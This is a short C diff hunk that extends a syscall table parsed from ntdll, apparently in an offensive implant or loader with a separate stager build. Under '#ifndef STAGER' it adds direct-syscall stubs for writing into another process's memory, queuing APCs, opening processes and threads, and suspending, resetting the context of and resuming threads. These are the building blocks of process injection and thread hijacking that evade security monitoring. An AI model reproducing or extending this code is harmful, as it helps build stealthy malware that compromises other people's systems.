@@ -58,6 +58,16 @@ VOID ParseNtdll(struct NtInfo *NtdllInfo, struct Syscalls *SyscallTable)
 
     SyscallTable->NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)(LPVOID)SyscallStub;
     SyscallTable->NtProtectVirtualMemory  = (_NtProtectVirtualMemory)(LPVOID)SyscallStub;
+    #ifndef STAGER
+    SyscallTable->NtWriteVirtualMemory    = (_NtWriteVirtualMemory)(LPVOID)SyscallStub;
+    SyscallTable->NtQueueApcThread        = (_NtQueueApcThread)(LPVOID)SyscallStub;
+    SyscallTable->NtOpenProcess           = (_NtOpenProcess)(LPVOID)SyscallStub;
+    SyscallTable->NtOpenThread            = (_NtOpenThread)(LPVOID)SyscallStub;
+    SyscallTable->NtSuspendThread         = (_NtSuspendThread)(LPVOID)SyscallStub;
+    SyscallTable->NtGetContextThread      = (_NtGetContextThread)(LPVOID)SyscallStub;
+    SyscallTable->NtSetContextThread      = (_NtSetContextThread)(LPVOID)SyscallStub;
+    SyscallTable->NtResumeThread          = (_NtResumeThread)(LPVOID)SyscallStub;
+    #endif
 
     VirtualProtect(SyscallStub, SYSCALL_STUB_SIZE, PAGE_READWRITE, &dwOldProc);
 
